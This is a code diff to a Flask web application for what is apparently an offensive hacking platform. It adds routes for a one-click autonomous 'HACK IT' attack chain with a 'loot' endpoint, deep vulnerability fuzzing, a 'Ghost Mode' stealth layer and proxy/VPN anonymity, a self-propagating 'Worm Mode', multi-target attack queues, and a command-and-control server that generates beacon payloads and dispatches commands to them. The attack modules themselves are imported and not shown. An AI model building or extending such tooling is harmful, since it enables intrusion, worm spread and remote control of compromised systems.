@@ -42,6 +42,12 @@ from modules.reporting.poc_generator import generate_poc_for_vuln, save_poc
 from modules.recon.osint import osint_engine
 from modules.core.browser_proxy import browser_proxy
 from modules.core.target_search import target_search
+# v4.0 New imports
+from modules.core.ai_copilot import ai_copilot
+from modules.core.multi_target import multi_target
+from modules.core.worm_engine import worm_engine
+from modules.core.ghost_mode import ghost_mode
+from modules.c2.multi_channel_c2 import multi_channel_c2
 
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -237,6 +243,24 @@ def proxy_health():
     except Exception as e:
         return jsonify({'total': 0, 'healthy': 0, 'dead': 0, 'healthy': False, 'error': str(e)})
 
+@app.route('/api/proxy/fetch_github', methods=['POST'])
+@login_required
+def api_proxy_fetch_github():
+    """Fetch proxies from proxifly free-proxy-list GitHub repo"""
+    data = request.get_json() or {}
+    proxy_type = data.get('proxy_type', 'all')
+    replace = data.get('replace', True)
+    try:
+        from modules.anonymity.proxy_manager import proxy_manager
+        result = proxy_manager.fetch_from_github(proxy_type=proxy_type, replace=replace)
+        if result.get('success'):
+            emit_feed('system', f'GitHub proxies fetched: {result["count"]} proxies ({result["mode"]} mode)', 'success')
+        else:
+            emit_feed('system', f'GitHub proxy fetch failed: {result.get("error", "?")}', 'error')
+        return jsonify(result)
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e), 'count': 0})
+
 @app.route('/api/proxy/settings', methods=['POST'])
 @login_required
 def proxy_settings():
@@ -379,6 +403,34 @@ def api_vpn_verify():
         return jsonify(protection)
     except:
         return jsonify({'protected': False, 'reason': 'VPN manager not available'})
+
+@app.route('/api/vpn/connect', methods=['POST'])
+@login_required
+def api_vpn_connect():
+    """Connect to Cloudflare Warp VPN"""
+    try:
+        from modules.anonymity.vpn_manager import vpn_manager
+        result = vpn_manager.connect_warp()
+        if result.get('success'):
+            emit_feed('system', f'🟢 Warp connected — IP: {result.get("ip", "?")}', 'success')
+        else:
+            emit_feed('system', f'🔴 Warp connect failed: {result.get("message", "?")}', 'error')
+        return jsonify(result)
+    except Exception as e:
+        return jsonify({'success': False, 'message': str(e)})
+
+@app.route('/api/vpn/disconnect', methods=['POST'])
+@login_required
+def api_vpn_disconnect():
+    """Disconnect from Cloudflare Warp VPN"""
+    try:
+        from modules.anonymity.vpn_manager import vpn_manager
+        result = vpn_manager.disconnect_warp()
+        if result.get('success'):
+            emit_feed('system', 'Warp disconnected', 'info')
+        return jsonify(result)
+    except Exception as e:
+        return jsonify({'success': False, 'message': str(e)})
 
 # ============================================================
 # OPSEC ENDPOINTS
@@ -2672,6 +2724,98 @@ def api_screenshot_capture():
 # Nuke, Batch Scan, PoC, Scan Compare, PDF Report, Auth Import, Proxy Health, OSINT
 # ============================================================
 
+@app.route('/api/autopilot/hack', methods=['POST'])
+@login_required
+def api_autopilot_hack():
+    """One-click HACK IT button — runs full autonomous attack chain."""
+    data = request.get_json()
+    target = data.get('target', '')
+    if not target: return jsonify({'error': 'Target required'}), 400
+    if not target.startswith('http'): target = 'https://' + target
+    
+    from modules.core.autopilot import autopilot
+    
+    # Wire up the live feed callback
+    def feed_callback(message, level='info'):
+        emit_feed('autopilot', message, level)
+    
+    autopilot.set_callback(feed_callback)
+    result = autopilot.run_mission(target, data.get('options', {}))
+    
+    emit_feed('autopilot', f'☢️ HACK IT initiated on {target}', 'system')
+    return jsonify(result)
+
+@app.route('/api/autopilot/status', methods=['GET'])
+@login_required
+def api_autopilot_status():
+    """Get current autopilot mission status."""
+    from modules.core.autopilot import autopilot
+    return jsonify(autopilot.get_status())
+
+@app.route('/api/autopilot/loot', methods=['GET'])
+@login_required
+def api_autopilot_loot():
+    """Get loot collected during the mission."""
+    from modules.core.autopilot import autopilot
+    return jsonify(autopilot.loot)
+
+@app.route('/api/deepscan', methods=['POST'])
+@login_required
+def api_deep_scan():
+    """Run deep scan with extensive payloads and parameter fuzzing."""
+    data = request.get_json()
+    target = data.get('target', '')
+    if not target: return jsonify({'error': 'Target required'}), 400
+    if not target.startswith('http'): target = 'https://' + target
+    
+    from modules.scanners.deep_scanner import deep_scanner
+    from modules.core.cve_matcher import cve_matcher
+    from modules.core.engine import engine
+    
+    scan_id = f"deep_{int(time.time())}"
+    
+    def run_deep():
+        try:
+            emit_feed(scan_id, f'🔍 Deep scanning {target}...', 'info')
+            discovered = deep_scanner.deep_crawl(target, max_pages=50, max_depth=3)
+            emit_feed(scan_id, f'🌐 Found {len(discovered["pages"])} pages, {len(discovered["forms"])} forms, {len(discovered["params"])} params', 'success')
+            
+            hidden = deep_scanner.fuzz_params(target)
+            if hidden:
+                emit_feed(scan_id, f'🔎 Found {len(hidden)} hidden parameters', 'success')
+            
+            vulns = deep_scanner.scan_all(target)
+            
+            # CVE matching
+            try:
+                fp = engine.fingerprint_target(target)
+                cves = cve_matcher.match_fingerprint(fp)
+                for cve in cves:
+                    vulns.append({
+                        'type': 'cve', 'cve_id': cve['cve'],
+                        'severity': cve['severity'], 'description': cve['desc'],
+                        'target': target, 'scanner': 'CVE Matcher'
+                    })
+                    emit_feed(scan_id, f'🔴 CVE: {cve["cve"]} — {cve["desc"]}', 'warning')
+            except: pass
+            
+            crit = sum(1 for v in vulns if v.get('severity') == 'critical')
+            high = sum(1 for v in vulns if v.get('severity') == 'high')
+            emit_feed(scan_id, f'✅ Deep scan complete — {len(vulns)} vulns ({crit} critical, {high} high)', 'success')
+            
+            socketio.emit('scan_complete', {'scan_id': scan_id, 'vulnerabilities': vulns, 'summary': {
+                'critical': crit, 'high': high, 'medium': sum(1 for v in vulns if v.get('severity') == 'medium'),
+                'low': sum(1 for v in vulns if v.get('severity') == 'low')
+            }})
+        except Exception as e:
+            emit_feed(scan_id, f'❌ Deep scan failed: {str(e)}', 'error')
+    
+    thread = threading.Thread(target=run_deep)
+    thread.daemon = True
+    thread.start()
+    
+    return jsonify({'scan_id': scan_id, 'status': 'started', 'target': target})
+
 @app.route('/api/nuke', methods=['POST'])
 @login_required
 def api_nuke():
@@ -3110,6 +3254,163 @@ def api_browser_analyze():
     
     analysis = '<br>'.join(analysis_parts)
     return jsonify({'analysis': analysis, 'page_info': info})
+
+# ============================================================
+# GHOST MODE ENDPOINTS
+# ============================================================
+@app.route('/api/ghost/activate', methods=['POST'])
+@login_required
+def api_ghost_activate():
+    """Activate Ghost Mode — enable all stealth layers."""
+    try:
+        result = ghost_mode.activate()
+        emit_feed('ghost', f'👻 Ghost Mode activated — {result.get("layers_active", 0)}/{result.get("layers_total", 10)} layers', 'success')
+        return jsonify(result)
+    except Exception as e:
+        return jsonify({'status': 'error', 'error': str(e)})
+
+@app.route('/api/ghost/deactivate', methods=['POST'])
+@login_required
+def api_ghost_deactivate():
+    """Deactivate Ghost Mode."""
+    try:
+        result = ghost_mode.deactivate()
+        emit_feed('ghost', '👻 Ghost Mode deactivated', 'info')
+        return jsonify(result)
+    except Exception as e:
+        return jsonify({'status': 'error', 'error': str(e)})
+
+@app.route('/api/ghost/status', methods=['GET'])
+@login_required
+def api_ghost_status():
+    """Get Ghost Mode status."""
+    try:
+        return jsonify(ghost_mode.get_status())
+    except Exception as e:
+        return jsonify({'active': False, 'error': str(e)})
+
+# ============================================================
+# WORM MODE ENDPOINTS
+# ============================================================
+@app.route('/api/worm/toggle', methods=['POST'])
+@login_required
+def api_worm_toggle():
+    """Toggle Worm Mode on/off."""
+    data = request.get_json() or {}
+    target = data.get('target', '')
+    try:
+        if worm_engine.active:
+            result = worm_engine.stop()
+        else:
+            result = worm_engine.start(target)
+        return jsonify(result)
+    except Exception as e:
+        return jsonify({'active': worm_engine.active, 'error': str(e)})
+
+@app.route('/api/worm/status', methods=['GET'])
+@login_required
+def api_worm_status():
+    """Get Worm Mode status."""
+    try:
+        return jsonify(worm_engine.get_status())
+    except Exception as e:
+        return jsonify({'active': False, 'error': str(e)})
+
+# ============================================================
+# MULTI-CHANNEL C2 ENDPOINTS
+# ============================================================
+@app.route('/api/c2/status', methods=['GET'])
+@login_required
+def api_c2_status():
+    """Get C2 server status."""
+    try:
+        return jsonify(multi_channel_c2.get_status())
+    except Exception as e:
+        return jsonify({'error': str(e)})
+
+@app.route('/api/c2/generate_multi', methods=['POST'])
+@login_required
+def api_c2_generate_multi():
+    """Generate multi-channel beacon payload."""
+    data = request.get_json()
+    beacon_id = data.get('beacon_id', f'beacon_{int(time.time())}')
+    channel = data.get('channel', 'all')
+    c2_server = data.get('c2_server', 'http://127.0.0.1:8443')
+    try:
+        payloads = multi_channel_c2.generate_beacon_payload(beacon_id, channel, c2_server)
+        return jsonify({'beacon_id': beacon_id, 'channel': channel, 'payloads': payloads})
+    except Exception as e:
+        return jsonify({'error': str(e)})
+
+@app.route('/api/c2/dispatch', methods=['POST'])
+@login_required
+def api_c2_dispatch():
+    """Dispatch a task to a beacon."""
+    data = request.get_json()
+    beacon_id = data.get('beacon_id', '')
+    command = data.get('command', '')
+    if not beacon_id or not command:
+        return jsonify({'error': 'Beacon ID and command required'}), 400
+    try:
+        task = multi_channel_c2.dispatch_task(beacon_id, command)
+        return jsonify(task)
+    except Exception as e:
+        return jsonify({'error': str(e)})
+
+# ============================================================
+# MULTI-TARGET ENDPOINTS
+# ============================================================
+@app.route('/api/multi/add', methods=['POST'])
+@login_required
+def api_multi_add():
+    """Add a target to the multi-target queue."""
+    data = request.get_json()
+    url = data.get('url', '')
+    if not url: return jsonify({'error': 'URL required'}), 400
+    target = multi_target.add_target(url)
+    emit_feed('multi', f'Target added: {url} ({len(multi_target.targets)} total)', 'info')
+    return jsonify(target)
+
+@app.route('/api/multi/list', methods=['GET'])
+@login_required
+def api_multi_list():
+    """List all targets in the multi-target queue."""
+    return jsonify(multi_target.get_targets())
+
+@app.route('/api/multi/clear', methods=['POST'])
+@login_required
+def api_multi_clear():
+    """Clear all targets."""
+    multi_target.clear_targets()
+    return jsonify({'success': True})
+
+@app.route('/api/multi/scan', methods=['POST'])
+@login_required
+def api_multi_scan():
+    """Scan all targets in the queue."""
+    result = multi_target.scan_all(run_full_scan_wrapper)
+    return jsonify(result)
+
+def run_full_scan_wrapper(target, scan_type):
+    """Wrapper to run a full scan and return vulnerabilities."""
+    scan_id = f"multi_{int(time.time())}"
+    scan_results[scan_id] = {
+        'id': scan_id, 'target': target, 'type': scan_type,
+        'status': 'running', 'started': datetime.now().isoformat(),
+        'vulnerabilities': [], 'progress': 0
+    }
+    run_full_scan(scan_id, target, scan_type)
+    return scan_results[scan_id].get('vulnerabilities', [])
+
+@app.route('/api/multi/compare', methods=['GET'])
+@login_required
+def api_multi_compare():
+    """Compare two targets' scan results."""
+    url1 = request.args.get('url1', '')
+    url2 = request.args.get('url2', '')
+    if not url1 or not url2:
+        return jsonify({'error': 'Both url1 and url2 required'}), 400
+    return jsonify(multi_target.compare_scans(url1, url2))
 
 @socketio.on('connect')
 def handle_connect():
